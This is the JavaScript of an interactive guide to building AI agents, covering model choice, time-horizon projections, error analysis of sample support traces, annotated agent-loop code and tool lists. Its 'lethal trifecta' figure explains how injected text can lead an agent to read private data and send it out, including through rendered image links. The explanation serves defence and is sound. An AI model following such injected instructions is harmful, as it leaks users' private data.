    $$('.part', svg).forEach((g) => { g.addEventListener('click', () => show(g.dataset.p)); g.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); show(g.dataset.p); } }); });
    show('server');
  })();

  /* ═════════ FIG 10 · MODEL PICKER ═════════ */
  (() => {
    const Q = [['hard', 'Hard reasoning or long, multi-hour tasks'], ['speed', 'Fast responses'], ['cheap', 'Low cost at high volume'], ['local', 'Data must stay on our own servers'], ['long', 'Very long documents or codebases']];
    const V = { hard: 2, speed: 1, cheap: 1, local: 0, long: 1 };
    const LBL = ['Not important', 'Nice to have', 'Important', 'Critical'];
    const qs = $('#pickQs'), out = $('#pickOut');
    Q.forEach(([k, q]) => {
      const d = el('div', 'pq', `<label for="pk-${k}">${q}<span id="pkv-${k}"></span></label>`);
      const r = el('input'); r.type = 'range'; r.id = 'pk-' + k; r.min = 0; r.max = 3; r.value = V[k];
      r.oninput = () => { V[k] = +r.value; upd(); }; d.append(r); qs.append(d);
    });
    const upd = () => {
      Q.forEach(([k]) => { $('#pkv-' + k).textContent = LBL[V[k]]; });
      let tier, h, p, ex, tips = [];
      if (V.local >= 2) { tier = 'Open-weight, self-hosted'; h = 'Run an open-weight model yourself'; p = 'When data can’t leave your infrastructure, download and host a model on your own hardware or private cloud.'; ex = 'Families such as Qwen, DeepSeek, Kimi and GLM, served with tools like vLLM.'; tips = ['Expect a few months’ lag behind the frontier on hard agentic tasks.', 'Budget for GPUs and operations work.', 'Alternatively, ask frontier providers about private deployments and data retention terms.']; }
      else if (V.hard >= 2 && (V.cheap >= 2 || V.speed >= 2)) { tier = 'Mixed fleet'; h = 'A strong planner with cheap, fast workers'; p = 'Use a frontier model for planning and hard judgment, and a small, fast model for subagents, extraction and bulk steps.'; ex = 'e.g. Claude Opus 5.5 orchestrating Haiku 5.5 subagents; similar pairings exist in the GPT and Gemini families.'; tips = ['Measure cost per completed task, not per call.', 'Try the strong model at lower effort first: it sometimes beats a cascade.']; }
      else if (V.hard >= 2) { tier = 'Frontier'; h = 'The most capable model you can afford'; p = 'Long-horizon and hard reasoning tasks are where top models pull furthest ahead, and failures cost more than tokens.'; ex = 'Claude Fable 5.2 or Opus 5.5, GPT-6.2 Astra, Gemini 3.5 Pro.'; tips = ['Raise the effort setting on genuinely hard work.', 'Give the full task spec up front; long tasks reward clarity.']; }
      else if (V.speed >= 2 || V.cheap >= 2) { tier = 'Fast & cheap'; h = 'A small, quick model'; p = 'For classification, extraction, routing and simple tool use at volume, small models are often good enough at a fraction of the price.'; ex = 'Claude Haiku 5.5, Gemini 3.5 Flash-Lite, lighter GPT-6 variants.'; tips = ['Check quality on your own eval set before switching.', 'Use prompt caching and batch APIs for further savings.']; }
      else { tier = 'Workhorse'; h = 'A balanced mid-tier model'; p = 'Most everyday agent work needs good tool use and reasonable speed more than peak intelligence.'; ex = 'Claude Sonnet 5.5, Gemini 3.5 Flash, mid-tier GPT-6 models.'; tips = ['Start here, then move up or down based on your evals.']; }
      if (V.long >= 2) tips.push('Look for million-token windows, but still practise context engineering: long inputs degrade quality.');
      out.innerHTML = `<span class="tier">${tier}</span><h4>${h}</h4><p>${p}</p><p><b>Examples (Nov 2026):</b> ${ex}</p><ul>${tips.map((t) => `<li>${t}</li>`).join('')}</ul>`;
    };
    upd();
  })();

  /* ═════════ FIG 11 · TIME HORIZON ═════════ */
  (() => {
    const svg = $('#hzSvg'), rng = $('#hzD');
    const W = 640, H = 340, L = 66, R = 16, T = 16, B = 40;
    const X0 = 2019, X1 = 2029.5, Ymin = Math.log10(1 / 60), Ymax = Math.log10(60 * 24 * 60);
    const x = (t) => L + (t - X0) / (X1 - X0) * (W - L - R);
    const y = (mins) => T + (1 - (Math.log10(mins) - Ymin) / (Ymax - Ymin)) * (H - T - B);
    const ANCHOR = [2025.12, 50];
    const PTS = [['GPT-2', 2019.13, 2 / 60], ['GPT-4', 2023.2, 5], ['Claude 3.7 Sonnet', 2025.12, 50]];
    const NOW = 2026.9;
    const ticks = [[1 / 60, '1 sec'], [1, '1 min'], [60, '1 hour'], [60 * 8, '8 hours'], [60 * 40, '1 work week'], [60 * 24 * 30, '1 month']];
    const fmt = (m) => m < 1 ? Math.round(m * 60) + ' seconds' : m < 60 ? Math.round(m) + ' minutes' : m < 60 * 8 ? (m / 60).toFixed(1) + ' hours' : m < 60 * 40 * 1.5 ? (m / 60).toFixed(0) + ' hours (~' + (m / 60 / 8).toFixed(1) + ' work days)' : (m / 60 / 40).toFixed(1) + ' work weeks';
    const draw = () => {
      const d = +rng.value; $('#hzDv').textContent = d + ' months';
      svg.innerHTML = '';
      ticks.forEach(([m, l]) => { svg.append(sv('line', { x1: L, x2: W - R, y1: y(m), y2: y(m), stroke: '#dcd5c6', 'stroke-dasharray': '3 5' })); const t = sv('text', { x: L - 8, y: y(m) + 4, 'text-anchor': 'end', fill: '#6b6f7a', 'font-size': 11, 'font-family': 'JetBrains Mono' }); t.textContent = l; svg.append(t); });
      for (let yr = 2019; yr <= 2029; yr += 2) { const t = sv('text', { x: x(yr), y: H - 14, 'text-anchor': 'middle', fill: '#6b6f7a', 'font-size': 11, 'font-family': 'JetBrains Mono' }); t.textContent = yr; svg.append(t); }
      const f = (t) => ANCHOR[1] * Math.pow(2, (t - ANCHOR[0]) * 12 / d);
      const seg = (a, b) => { let s = ''; for (let t = a; t <= b + 1e-9; t += .05) { const m = f(t); if (m < 1 / 60 || m > 60 * 24 * 60) continue; s += (s ? 'L' : 'M') + x(t).toFixed(1) + ' ' + y(m).toFixed(1); } return s; };
      svg.append(sv('path', { d: seg(X0, ANCHOR[0]), fill: 'none', stroke: '#13161d', 'stroke-width': 2.5 }));
      svg.append(sv('path', { d: seg(ANCHOR[0], X1), fill: 'none', stroke: '#ff5a36', 'stroke-width': 2.5, 'stroke-dasharray': '7 6' }));
      svg.append(sv('line', { x1: x(NOW), x2: x(NOW), y1: T, y2: H - B, stroke: '#4053d6', 'stroke-width': 1.5 }));
      const nt = sv('text', { x: x(NOW) + 5, y: T + 12, fill: '#4053d6', 'font-size': 11, 'font-family': 'Manrope', 'font-weight': 700 }); nt.textContent = 'Now'; svg.append(nt);
      PTS.forEach(([n, t, m], i) => {
        svg.append(sv('circle', { cx: x(t), cy: y(m), r: 6, fill: '#ffc94a', stroke: '#13161d', 'stroke-width': 2 }));
        const tx = sv('text', { x: x(t) + (i === 2 ? -10 : 10), y: y(m) - 10, 'text-anchor': i === 2 ? 'end' : 'start', fill: '#13161d', 'font-size': 11.5, 'font-family': 'Manrope', 'font-weight': 700 }); tx.textContent = n; svg.append(tx);
      });
      const pl = sv('text', { x: x(2027.6), y: y(f(2027.6)) + 22, fill: '#d8401f', 'font-size': 11, 'font-family': 'Manrope', 'font-weight': 700 }); pl.textContent = 'projection'; if (f(2027.6) < 60 * 24 * 40) svg.append(pl);
      $('#hzOut').innerHTML = `At a ${d}-month doubling time, the trend implies agents completing <b>${fmt(f(NOW))}</b> tasks around now, and <b>${fmt(f(2028.9))}</b> tasks by the end of 2028. Treat this as a thought experiment, not a forecast.`;
    };
    rng.oninput = draw; draw();
  })();

  /* ═════════ FIG 12 · ERROR ANALYSIS ═════════ */
  (() => {
    const CATS = ['Wrong tool input', 'Over-escalated', 'Made something up', 'Misread policy', 'Tone'];
    const TR = [
      ['I want a refund, my email is ria.k@mail.com', 'lookup_order("ria.k@mail.com")', 'Error: invalid order ID', 'I couldn’t find your order. Could you share the order number?', 0],
      ['My lamp arrived broken, order KR-2201', 'lookup_order("KR-2201") · check_policy(…, "damaged")', 'eligible: full refund', 'I’ll pass this to a colleague who can help.', 1],
      ['Refund for order 3341 please', 'lookup_order("3341")', 'Error: invalid order ID', 'Sorry, that order doesn’t exist.', 0],
      ['Can I return the sofa? KR-1190', 'lookup_order("KR-1190")', 'delivered 52 days ago', 'Yes, our policy allows returns within 60 days, so you’re covered!', 2],
      ['Wrong colour chair, KR-7712', 'lookup_order · check_policy(…, "wrong item")', 'eligible: exchange or refund', 'Escalating to our team for review.', 1],
      ['Refund? It’s order #kr 4410', 'lookup_order("#kr 4410")', 'Error: invalid order ID', 'I can’t locate that order, sorry.', 0],
      ['Partial refund for missing cushion, KR-3002', 'check_policy(KR-3002, "missing part")', 'eligible: ₹1,200 partial', 'You’re eligible for a full refund of ₹14,800.', 3],
      ['This is the third time I’m asking!! KR-5521', 'lookup_order · check_policy', 'eligible: refund', 'As previously stated, refunds take 5–7 days. Please be patient.', 4],
      ['Damaged table leg, order KR-6610', 'lookup_order · check_policy(…, "damaged")', 'eligible: replacement part', 'Let me escalate this to a specialist.', 1],
      ['Refund for priya.m@mail.in’s order', 'lookup_order("priya.m@mail.in")', 'Error: invalid order ID', 'Please provide a valid order number.', 0],
      ['Do you price-match? KR-9001', '(no tools called)', '—', 'Yes, we match any competitor’s price within 14 days.', 2],
      ['Refund for sale item KR-8120', 'check_policy(KR-8120, "changed mind")', 'not eligible: final sale', 'Sale items can be refunded within 30 days.', 3]
    ];
    let i = 0; const lab = new Array(TR.length).fill(null);
    const tr = $('#errTrace'), bars = $('#errBars'), msg = $('#errMsg');
    const renderBars = () => {
      const cnt = CATS.map((_, k) => lab.filter((v) => v === k).length);
      const max = Math.max(1, ...cnt), order = CATS.map((c, k) => k).sort((a, b) => cnt[b] - cnt[a]);
      bars.innerHTML = order.map((k, j) => `<div class="eb ${j === 0 && cnt[k] ? 'top' : ''}"><span>${CATS[k]}</span><i><b style="width:${cnt[k] / max * 100}%"></b></i><em>${cnt[k]}</em></div>`).join('');
      const n = lab.filter((v) => v !== null).length;
      if (n < TR.length) msg.innerHTML = `${n} of ${TR.length} labelled. Keep going: patterns appear after a handful.`;
      else {
        const agree = lab.filter((v, k) => v === TR[k][4]).length;
        msg.innerHTML = `<b>Done.</b> You matched the expert labels on ${agree} of 12. By the expert labels, the biggest cluster is <b>wrong tool input</b>: customers give emails or odd formats, and the lookup tool only accepts clean order IDs. <b>Fix the tool, not the prompt</b>: accept emails and normalise IDs. That one change addresses a third of failures. Next: over-escalation, then fabricated policy.`;
      }
    };
    const render = () => {
      const [u, c, r, a] = TR[i];
      tr.innerHTML = `<div class="err-card"><div class="eh"><span>Trace ${i + 1} of ${TR.length}</span><span>${lab[i] !== null ? 'labelled: ' + CATS[lab[i]] : 'unlabelled'}</span></div>
        <pre class="tr"><span class="u">user  ›</span> ${esc(u)}\n<span class="c">tool  ›</span> ${esc(c)}\n<span class="r">result›</span> ${esc(r)}\n<span class="a">agent ›</span> ${esc(a)}</pre>
        <p class="q">What went wrong?</p><div class="err-opts">${CATS.map((cat, k) => `<button data-k="${k}" ${lab[i] === k ? 'style="border-color:var(--coral);background:#fff5f1"' : ''}>${cat}</button>`).join('')}</div>
        <div class="err-nav"><button class="btn" id="errPrev" ${i === 0 ? 'disabled' : ''}>← Prev</button><span>${lab.filter((v) => v !== null).length}/12</span><button class="btn" id="errNext" ${i === TR.length - 1 ? 'disabled' : ''}>Next →</button></div></div>`;
      $$('.err-opts button', tr).forEach((b) => b.onclick = () => { lab[i] = +b.dataset.k; renderBars(); if (i < TR.length - 1) { i++; } render(); });
      $('#errPrev').onclick = () => { i = Math.max(0, i - 1); render(); };
      $('#errNext').onclick = () => { i = Math.min(TR.length - 1, i + 1); render(); };
    };
    render(); renderBars();
  })();

  /* ═════════ CODE ═════════ */
  (() => {
    const CODE = {
      loop: { src: `import anthropic

client = anthropic.Anthropic()  # reads ANTHROPIC_API_KEY

tools = [{
    "name": "get_order",
    "description": "Look up an order by ID. Returns items, date, total and status.",
    "input_schema": {
        "type": "object",
        "properties": {"order_id": {"type": "string", "description": "e.g. KR-10422"}},
        "required": ["order_id"],
    },
}]

def run_tool(name, args):
    if name == "get_order":
        return lookup_order_in_db(args["order_id"])  # your code
    return f"Unknown tool: {name}"

messages = [{"role": "user", "content": "Where is order KR-10422?"}]

for step in range(10):  # hard cap on steps
    response = client.messages.create(
        model="claude-opus-5-5",
        max_tokens=16000,
        system="You are a helpful order-support agent.",
        tools=tools,
        messages=messages,
    )
    messages.append({"role": "assistant", "content": response.content})

    if response.stop_reason != "tool_use":  # finished, or needs the user
        break

    results = []
    for block in response.content:
        if block.type == "tool_use":
            output = run_tool(block.name, block.input)
            results.append({"type": "tool_result",
                            "tool_use_id": block.id,
                            "content": str(output)})
    messages.append({"role": "user", "content": results})

print("".join(b.text for b in response.content if b.type == "text"))`,
        notes: { 3: ['The client', 'The official SDK. It finds your API key in the environment, so it never appears in code.'], 5: ['Tool definitions', 'Each tool has a name, a description written for the model, and a JSON Schema for its inputs. This list is sent with every request.'], 7: ['The description is a prompt', 'Say what it does, what it returns and when to use it. This one sentence decides whether the model calls the tool well.'], 15: ['Your code runs the tools', 'The model only asks. This function is where real actions happen, and where permissions and validation belong.'], 20: ['The conversation', 'The task starts as a single user message. Everything that follows is appended here.'], 22: ['The agent loop, with a cap', 'Ten steps maximum. Always bound your loops so a confused agent can’t spin forever.'], 23: ['One model call per step', 'The whole conversation, tools and system prompt go out on every iteration. The model is stateless.'], 24: ['The model', 'A current Claude model ID. Swap it for a cheaper or stronger model without changing the loop.'], 30: ['Keep the full response', 'Append the assistant’s whole content, including its tool_use blocks, not just its text.'], 32: ['Stop reason', 'If the model didn’t ask for a tool, it has finished or needs the user. Exit the loop.'], 36: ['Run each requested tool', 'A single turn can request several tools at once. Run them all.'], 38: ['Match results to calls', 'Each tool_result carries the ID of the tool_use it answers.'], 41: ['Results go back as a user turn', 'All results return together in one message, and the loop continues.'], 43: ['The final answer', 'The text blocks of the last response are the agent’s reply.'] } },
      runner: { src: `import anthropic
from anthropic import beta_tool

client = anthropic.Anthropic()

@beta_tool
def get_order(order_id: str) -> str:
    """Look up an order by ID. Returns items, date, total and status.

    Args:
        order_id: The order ID, e.g. KR-10422.
    """
    return lookup_order_in_db(order_id)  # your code

runner = client.beta.messages.tool_runner(
    model="claude-opus-5-5",
    max_tokens=16000,
    system="You are a helpful order-support agent.",
    tools=[get_order],
    messages=[{"role": "user", "content": "Where is order KR-10422?"}],
)

final = runner.until_done()
print("".join(b.text for b in final.content if b.type == "text"))`,
        notes: { 6: ['A decorated function', 'The decorator turns an ordinary Python function into a tool. The schema is generated from the type hints.'], 8: ['The docstring is the description', 'What you write here is what the model reads. Describe arguments under Args.'], 15: ['The tool runner', 'The SDK runs the whole loop: call the model, execute requested tools, send results back, repeat until done.'], 23: ['Run to completion', 'Returns the final message once the model stops asking for tools.'] } }
    };
    const box = $('#codeBox'), note = $('#codeNote');
    let cur = 'loop';
    const hl = (line) => { let out = '', last = 0; const re = /(#.*$)|("[^"]*")|\b(import|from|def|return|for|in|if|break|print)\b/g; let m; while ((m = re.exec(line))) { out += esc(line.slice(last, m.index)); out += m[1] ? '<span class="cm">' + esc(m[1]) + '</span>' : m[2] ? '<span class="st">' + esc(m[2]) + '</span>' : '<span class="kw">' + m[3] + '</span>'; last = re.lastIndex; } return out + esc(line.slice(last)); };
    const render = () => {
      const c = CODE[cur];
      box.innerHTML = c.src.split('\n').map((l, i) => `<span class="l${c.notes[i + 1] ? ' n' : ''}" data-i="${i + 1}">${hl(l) || ' '}</span>`).join('');
      note.innerHTML = '<b>How it works</b>Hover or tap a highlighted line.';
      $$('.l.n', box).forEach((ln) => { const f = () => { $$('.l.on', box).forEach((x) => x.classList.remove('on')); ln.classList.add('on'); const [t, d] = c.notes[+ln.dataset.i]; note.innerHTML = `<b>Line ${ln.dataset.i} · ${t}</b>${d}`; }; ln.addEventListener('mouseenter', f); ln.addEventListener('click', f); });
    };
    $$('.code-tabs [data-tab]').forEach((b) => b.onclick = () => { cur = b.dataset.tab; $$('.code-tabs [data-tab]').forEach((x) => x.classList.toggle('on', x === b)); render(); });
    $('#codeCopy').onclick = async () => { try { await navigator.clipboard.writeText(CODE[cur].src); $('#codeCopy').textContent = 'Copied ✓'; } catch (e) { $('#codeCopy').textContent = 'Select & copy'; } setTimeout(() => { $('#codeCopy').textContent = 'Copy'; }, 1800); };
    render();
  })();

  /* ═════════ FIG 13 · KIT ═════════ */
  (() => {
    const K = [
      ['Claude Code', 'Coding agents', 'Anthropic’s agentic coding tool for the terminal, IDE, desktop and web.'], ['OpenAI Codex', 'Coding agents', 'OpenAI’s coding agent, in the CLI, IDE and cloud.'], ['Cursor', 'Coding agents', 'AI-first code editor with an agent mode and background agents.'], ['GitHub Copilot', 'Coding agents', 'Includes a coding agent that works on issues and opens pull requests.'], ['Google Antigravity', 'Coding agents', 'Google’s agent-first development environment.'], ['Cline · Aider', 'Coding agents', 'Popular open-source coding agents that work with many models.'],
      ['Claude Agent SDK', 'Frameworks', 'The harness behind Claude Code as a library: tools, subagents, permissions, context management.'], ['OpenAI Agents SDK', 'Frameworks', 'Lightweight Python/TS framework with handoffs, guardrails and tracing.'], ['Google ADK', 'Frameworks', 'Agent Development Kit for building and deploying agents, especially on Google Cloud.'], ['LangGraph', 'Frameworks', 'Graph-based orchestration for stateful, long-running agents.'], ['CrewAI', 'Frameworks', 'Role-based multi-agent “crews” with a gentle learning curve.'], ['Microsoft Agent Framework', 'Frameworks', 'Successor to AutoGen and Semantic Kernel for .NET and Python.'], ['Pydantic AI', 'Frameworks', 'Type-safe Python agent framework from the Pydantic team.'], ['Vercel AI SDK · Mastra', 'Frameworks', 'TypeScript toolkits for agents in web apps.'],
      ['Claude Managed Agents', 'Platforms', 'Anthropic-hosted agent loop and sandbox, with sessions, tools and MCP (beta).'], ['OpenAI AgentKit', 'Platforms', 'Visual agent builder, connectors and evaluation tooling.'], ['Amazon Bedrock AgentCore', 'Platforms', 'AWS services for running, securing and observing agents at scale.'], ['Vertex AI Agent Engine', 'Platforms', 'Google Cloud’s managed runtime for agents.'],
      ['MCP', 'Protocols', 'The standard for connecting agents to tools and data.'], ['A2A', 'Protocols', 'Agent-to-agent discovery and delegation across vendors.'], ['AGENTS.md', 'Protocols', 'Project instructions for coding agents, in one Markdown file.'], ['Agent Skills', 'Protocols', 'Packaged, load-on-demand expertise for agents.'],
      ['LangSmith', 'Evals & observability', 'Tracing, datasets and evals, closely tied to LangChain/LangGraph.'], ['Langfuse', 'Evals & observability', 'Open-source tracing, prompt management and evals.'], ['Braintrust', 'Evals & observability', 'Eval-first platform for experiments, scoring and production logs.'], ['Arize Phoenix', 'Evals & observability', 'Open-source observability built on OpenTelemetry.'], ['Inspect', 'Evals & observability', 'Open-source eval framework from the UK AI Security Institute.'], ['Promptfoo', 'Evals & observability', 'Open-source testing and red-teaming for prompts and agents.'],
      ['n8n', 'No-code', 'Visual workflow automation with AI agent nodes; self-hostable.'], ['Zapier Agents', 'No-code', 'Agents that act across thousands of connected apps.'], ['Make', 'No-code', 'Visual scenario builder with AI agents.']
    ];
    const box = $('#kit'), filt = $('#kitFilter');
    const cats = ['All', ...new Set(K.map((k) => k[1]))]; let cur = 'All';
    const render = () => { box.innerHTML = ''; K.filter((k) => cur === 'All' || k[1] === cur).forEach(([n, c, d], i) => { const e = el('div', 'kt', `<span>${c}</span><b>${n}</b><p>${d}</p>`); e.style.animationDelay = Math.min(i * 25, 400) + 'ms'; box.append(e); }); };
    cats.forEach((c) => { const b = el('button', 'chip' + (c === cur ? ' on' : ''), c); b.onclick = () => { cur = c; $$('.chip', filt).forEach((x) => x.classList.toggle('on', x === b)); render(); }; filt.append(b); });
    render();
  })();

  /* ═════════ FIG 14 · TRIFECTA ═════════ */
  (() => {
    const T = [['data', 'Access to private data', 'Your email, files, databases, customer records', '#4053d6', 130, 120], ['untrusted', 'Exposure to untrusted content', 'Web pages, inbound email, uploaded documents, issues', '#a2479b', 230, 120], ['out', 'Ability to communicate externally', 'Send email, make web requests, post, create links', '#0e8a8c', 180, 205]];
    const on = { data: true, untrusted: true, out: false };
    const svg = $('#triSvg'), tg = $('#triToggles'), out = $('#triOut');
    T.forEach(([k, n, s]) => {
      const lab = el('label', 'tg', `<input type="checkbox" ${on[k] ? 'checked' : ''}><span><b>${n}</b><small>${s}</small></span>`);
      $('input', lab).onchange = (e) => { on[k] = e.target.checked; draw(); }; tg.append(lab);
    });
    const draw = () => {
      svg.innerHTML = '';
      T.forEach(([k, n, , col, cx, cy]) => {
        svg.append(sv('circle', { cx, cy, r: 92, fill: col, 'fill-opacity': on[k] ? .32 : .06, stroke: col, 'stroke-opacity': on[k] ? 1 : .35, 'stroke-width': 2 }));
      });
      const lbl = [['Private data', 92, 92], ['Untrusted', 268, 92], ['content', 268, 106], ['External', 180, 268], ['comms', 180, 282]];
      lbl.forEach(([t, x, y]) => { const e = sv('text', { x, y }); e.textContent = t; svg.append(e); });
      const all = on.data && on.untrusted && on.out;
      const core = sv('g', { class: 'core', opacity: all ? 1 : 0 });
      core.append(sv('circle', { cx: 180, cy: 150, r: 22, fill: '#ff5a36' }));
      const ct = sv('text', { x: 180, y: 155, style: 'font-size:16px' }); ct.textContent = '!'; core.append(ct);
      svg.append(core);
      const n = Object.values(on).filter(Boolean).length;
      let h, p, col;
      if (all) { h = 'Lethal trifecta: high risk'; col = '#ff8a6e'; p = 'An attacker who gets text in front of this agent (a web page, an email) can instruct it to read private data and send it out. Break the combination: remove one leg for tasks touching untrusted content, require human approval for every outbound action, or tightly allow-list destinations.'; }
      else if (on.data && on.untrusted) { h = 'Contained, for now'; col = '#ffc94a'; p = 'Injected instructions can manipulate what the agent does with your data, but it can’t send data out. Watch for sneaky exfiltration channels: rendering images or links from URLs counts as communicating externally.'; }
      else if (on.untrusted && on.out) { h = 'Manipulable, little to steal'; col = '#ffc94a'; p = 'Untrusted content can steer outbound actions (spam, unwanted posts), but there’s no private data to leak. Rate-limit and review outbound actions.'; }
      else if (on.data && on.out) { h = 'Fine if inputs stay trusted'; col = '#3ecf8e'; p = 'Safe as long as nothing untrusted ever enters the context. That’s harder than it sounds: a shared document or calendar invite can be untrusted. Keep auditing inputs.'; }
      else { h = n === 0 ? 'No risky capabilities' : 'Low risk'; col = '#3ecf8e'; p = 'With at most one of the three, prompt injection has limited impact. Ordinary security hygiene applies.'; }
      out.innerHTML = `<b style="color:${col}">${h}</b>${p}`;
    };
    draw();
  })();

  /* ═════════ FIG 15 · GLOSSARY ═════════ */
  (() => {
    const list = $('#glList'), q = $('#glSearch'), catBox = $('#glCats');
    const cats = ['All', ...new Set(G.map((g) => g[2]))]; let cur = 'All';
    const render = () => {
      const s = q.value.trim().toLowerCase();
      const items = G.filter(([, t, c, d]) => (cur === 'All' || c === cur) && (!s || t.toLowerCase().includes(s) || d.toLowerCase().includes(s))).sort((a, b) => a[1].localeCompare(b[1]));
      const mark = (txt) => { const e = esc(txt); if (!s) return e; const i = e.toLowerCase().indexOf(esc(s)); return i < 0 ? e : e.slice(0, i) + '<mark>' + e.slice(i, i + esc(s).length) + '</mark>' + e.slice(i + esc(s).length); };
      list.innerHTML = items.map(([id, t, c, d]) => `<div id="gl-${id}"><dt>${mark(t)}<span>${c}</span></dt><dd>${mark(d)}</dd></div>`).join('') || '<p class="fine">No terms match. Try a shorter word.</p>';
      $('#glCount').textContent = `${items.length} of ${G.length} terms`;
    };
    cats.forEach((c) => { const b = el('button', 'chip' + (c === cur ? ' on' : ''), c); b.onclick = () => { cur = c; $$('.chip', catBox).forEach((x) => x.classList.toggle('on', x === b)); render(); }; catBox.append(b); });
    q.addEventListener('input', render);
    q.placeholder = `Search ${G.length} terms…`;
    render();
    document.addEventListener('click', (e) => {
      const a = e.target.closest('a[data-gl]'); if (!a) return;
      e.preventDefault(); hidePop();
      cur = 'All'; q.value = ''; $$('.chip', catBox).forEach((x, i) => x.classList.toggle('on', i === 0)); render();
      const t = $('#gl-' + a.dataset.gl); if (!t) return;
      $('#ch-glossary').scrollIntoView({ behavior: RM ? 'auto' : 'smooth' });
      setTimeout(() => { list.scrollTop = t.offsetTop - list.offsetTop - 10; t.classList.add('flash'); setTimeout(() => t.classList.remove('flash'), 1800); }, RM ? 0 : 650);
    });
  })();

  /* ═════════ RESOURCES + PATH ═════════ */
  (() => {
    const R = [
      ['Building effective agents', 'Anthropic', 'Guide', 'Beginner', 'https://www.anthropic.com/engineering/building-effective-agents', 'The essay that defined workflows versus agents and the core patterns. Start here.'],
      ['A practical guide to building agents', 'OpenAI', 'Guide', 'Beginner', 'https://cdn.openai.com/business-guides-and-resources/a-practical-guide-to-building-agents.pdf', 'A clear, vendor-neutral-ish primer on agent design, orchestration and guardrails.'],
      ['Effective context engineering for AI agents', 'Anthropic', 'Guide', 'Intermediate', 'https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents', 'How to treat context as a finite resource: prompts, tools, retrieval, compaction, subagents.'],
      ['Writing effective tools for agents', 'Anthropic', 'Guide', 'Intermediate', 'https://www.anthropic.com/engineering/writing-tools-for-agents', 'Practical rules for tool design, and how to use agents to improve their own tools.'],
      ['How we built our multi-agent research system', 'Anthropic', 'Guide', 'Advanced', 'https://www.anthropic.com/engineering/multi-agent-research-system', 'A candid production case study: architecture, prompting, evaluation and costs.'],
      ['Prompt engineering overview', 'Anthropic docs', 'Docs', 'Beginner', 'https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/overview', 'The official, regularly updated guide to prompting Claude models.'],
      ['Claude Agent SDK', 'Anthropic docs', 'Docs', 'Intermediate', 'https://code.claude.com/docs/en/agent-sdk', 'Build agents on the same harness as Claude Code.'],
      ['Model Context Protocol', 'modelcontextprotocol.io', 'Docs', 'Intermediate', 'https://modelcontextprotocol.io/', 'Specification, tutorials and SDKs for building MCP servers and clients.'],
      ['Agents Course', 'Hugging Face', 'Course', 'Beginner', 'https://huggingface.co/learn/agents-course', 'A free, hands-on course from fundamentals to frameworks, with certificates.'],
      ['Agentic AI', 'Andrew Ng · DeepLearning.AI', 'Course', 'Beginner', 'https://www.deeplearning.ai/courses/agentic-ai/', 'Reflection, tool use, planning and multi-agent patterns, taught from first principles.'],
      ['AI Engineering', 'Chip Huyen · O’Reilly, 2025', 'Book', 'Intermediate', 'https://www.oreilly.com/library/view/ai-engineering/9781098166298/', 'The best single book on building applications with foundation models, including agents and evaluation.'],
      ['Your AI product needs evals', 'Hamel Husain', 'Blog', 'Intermediate', 'https://hamel.dev/blog/posts/evals/', 'The classic case for evals and error analysis, with practical steps.'],
      ['AI Evals for Engineers & PMs', 'Hamel Husain & Shreya Shankar', 'Course', 'Advanced', 'https://maven.com/parlance-labs/evals', 'The most respected course on evaluation methodology for LLM products.'],
      ['Simon Willison’s Weblog', 'Simon Willison', 'Blog', 'All levels', 'https://simonwillison.net/', 'Daily, clear-eyed notes on models, agents, tools and prompt-injection security.'],
      ['LLM Powered Autonomous Agents', 'Lilian Weng, 2023', 'Blog', 'Intermediate', 'https://lilianweng.github.io/posts/2023-06-23-agent/', 'A foundational survey of planning, memory and tool use. Still a great mental model.'],
      ['12-Factor Agents', 'Dex Horthy · HumanLayer', 'Guide', 'Advanced', 'https://github.com/humanlayer/12-factor-agents', 'Principles for production-grade agents, learned from teams who shipped them.'],
      ['ReAct', 'Yao et al., 2022', 'Paper', 'Advanced', 'https://arxiv.org/abs/2210.03629', 'The paper that interleaved reasoning and acting: the root of the agent loop.'],
      ['SWE-agent', 'Yang et al., 2024', 'Paper', 'Advanced', 'https://arxiv.org/abs/2405.15793', 'Introduced the agent-computer interface and showed interface design matters.'],
      ['Latent Space', 'swyx & Alessio', 'Podcast', 'Intermediate', 'https://www.latent.space/', 'The AI engineer’s podcast and newsletter: interviews with the people building agents.'],
      ['METR time horizons', 'METR', 'Tracker', 'All levels', 'https://metr.org/time-horizons/', 'The long-run measure of how long a task frontier agents can complete.'],
      ['Artificial Analysis', 'Artificial Analysis', 'Tracker', 'All levels', 'https://artificialanalysis.ai/', 'Independent leaderboards for model quality, speed and price, including agentic indices.']
    ];
    const box = $('#res'), filt = $('#resFilter');
    const types = ['All', ...new Set(R.map((r) => r[2]))]; let cur = 'All';
    const render = () => { box.innerHTML = ''; R.filter((r) => cur === 'All' || r[2] === cur).forEach(([t, a, ty, lv, u, d], i) => { const e = el('a', 'rs', `<div class="rt"><span>${ty}</span><span class="lv">${lv}</span></div><b>${t}</b><small>${a}</small><p>${d}</p><span class="go">Open →</span>`); e.href = u; e.target = '_blank'; e.rel = 'noopener'; e.style.animationDelay = Math.min(i * 30, 400) + 'ms'; box.append(e); }); };
    types.forEach((c) => { const b = el('button', 'chip' + (c === cur ? ' on' : ''), c); b.onclick = () => { cur = c; $$('.chip', filt).forEach((x) => x.classList.toggle('on', x === b)); render(); }; filt.append(b); });
    render();

    const W = [
      ['Week 1', 'Use', ['Read chapters 1–4 of this guide', 'Give a coding or research agent three real tasks', 'Write an AGENTS.md or CLAUDE.md for one project', 'Rewrite one failed prompt using all seven brief parts']],
      ['Week 2', 'Understand', ['Read Anthropic’s Building Effective Agents', 'Build the thirty-line agent loop yourself', 'Add a second tool and read the traces', 'Read the context-engineering guide']],
      ['Week 3', 'Build', ['Pick a small real task; write 20 golden examples', 'Build a workflow version first', 'Connect one MCP server to an agent', 'Redesign your tools using the tool-writing guide']],
      ['Week 4', 'Measure & ship', ['Run error analysis on 30 traces', 'Write three automated evals', 'Add guardrails: step cap, spend cap, approvals', 'Put it in front of one real user and collect feedback']]
    ];
    const KEY = 'lrn-agent-path-4w'; let st = store.get(KEY, {});
    const path = $('#path');
    W.forEach(([wk, t, items], wi) => {
      const c = el('div', 'wk', `<h5>${wk}</h5><h4>${t}</h4>`);
      items.forEach((it, ii) => {
        const id = wi + '-' + ii, lab = el('label'), cb = el('input'); cb.type = 'checkbox'; cb.checked = !!st[id];
        cb.onchange = () => { if (cb.checked) st[id] = 1; else delete st[id]; store.set(KEY, st); mark(); };
        lab.append(cb, el('span', '', it)); c.append(lab);
      });
      path.append(c);
    });
